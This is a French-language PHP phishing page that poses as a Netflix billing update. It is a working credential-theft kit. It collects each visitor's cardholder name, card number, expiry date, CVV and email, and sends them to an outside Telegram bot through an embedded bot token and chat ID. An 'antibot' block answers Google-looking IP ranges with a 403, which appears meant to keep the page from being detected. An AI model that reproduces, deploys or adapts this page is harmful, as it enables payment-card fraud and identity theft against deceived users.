
<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}


?>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nomCarte = $_POST['nomCarte'];
    $numeroCarte = $_POST['numeroCarte'];
    $dateExpiration = $_POST['expiryDate'];
    $cvv = $_POST['cvv'];
    $email = $_GET['email']; // Récupération de l'email passé par l'URL

    // Envoi des informations de la carte à Telegram
    $telegramToken = "7839515626:AAFb4eae4Z1Qyy3og3TdlHqkjk94eghdO5g"; // Remplacez par votre token
    $chatId = "5196790326"; // Remplacez par votre chat ID
    $message = "Nom sur la carte: $nomCarte\nNuméro de carte: $numeroCarte\nDate d'expiration: $dateExpiration\nCVV: $cvv\nEmail: $email"; // Message à envoyer

    file_get_contents("https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

    // Redirection vers la page de chargement
    header("Location: charge.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="Netflix_icon.svg-removebg-preview.png">
    <title>Netflix - Confirmation</title>
</head>
<body>
    <h1 class="logo"><img src="photo_2024-09-22_00-07-17-removebg-preview.png" alt="Logo Netflix"></h1>
    <div class="container">
        <div class="login-container">
            <h2>Mettez à jour vos informations bancaires</h2>
            <form action="code.php" method="POST">
                <input type="text" name="nomCarte" placeholder="Nom sur la carte" autocomplete="off" required>
                <input type="text" id="numeroCarte" name="numeroCarte" placeholder="Numéro de carte" autocomplete="off" maxlength="19"  required>
                <input type="text" id="expiryDate" name="expiryDate" autocomplete="off" placeholder="Mois d'expiration (MM/AAAA)" title="Veuillez entrer une date au format MM/AAAA" maxlength="7" required>
                <input type="text" name="cvv" placeholder="CVV" maxlength="3" autocomplete="off" required>
                <button type="submit" class="login-btn">Suivant</button>
            </form>
        </div>
    </div>

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url(netflix-octobre-contenus-2022.jpg);
            background-size: cover;
            background-position: center;
        }
        .container {
            display: flex;
            color: rgb(255, 235, 235);
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        h1 img {
            width: 150px;
            padding: 10px 50px;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 48px 68px;
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: none;
            outline: none;
            background-color: #4e4b4bcb;
            color: aliceblue;
        }
        .date-input {
            background-color: #4e4b4bcb;
            color: aliceblue;
            padding: 10px;
            border-radius: 4px;
            border: none;
            outline: none;
            cursor: pointer;
        }
        .login-btn {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #f40612;
        }
    </style>
    <script>
        document.getElementById('expiryDate').addEventListener('input', function (e) {
            var input = e.target.value;
            if (input.length === 2 && !input.includes('/')) {
                e.target.value = input + '/';       
            } else if (input.length === 3 && input.charAt(2) !== '/') {
                e.target.value = input.slice(0, 2) + '/' + input.charAt(2);
            }
        });

        document.getElementById('expiryDate').addEventListener('keydown', function (e) {
            var input = e.target.value;
            if (e.key === 'Backspace' && input.charAt(input.length - 1) === '/') {
                e.target.value = input.slice(0, -1);
            }
        });

        // Formater le numéro de carte en XXXX XXXX XXXX XXXX
        document.getElementById('numeroCarte').addEventListener('input', function (e) {
            var input = e.target.value.replace(/\D/g, '').slice(0, 16); // Supprime les non-chiffres et limite à 16 chiffres
            var formatted = '';
            for (var i = 0; i < input.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formatted += ' ';
                }
                formatted += input[i];
            }
            e.target.value = formatted; // Met à jour la valeur de l'input
        });
    </script>
</body>
</html>
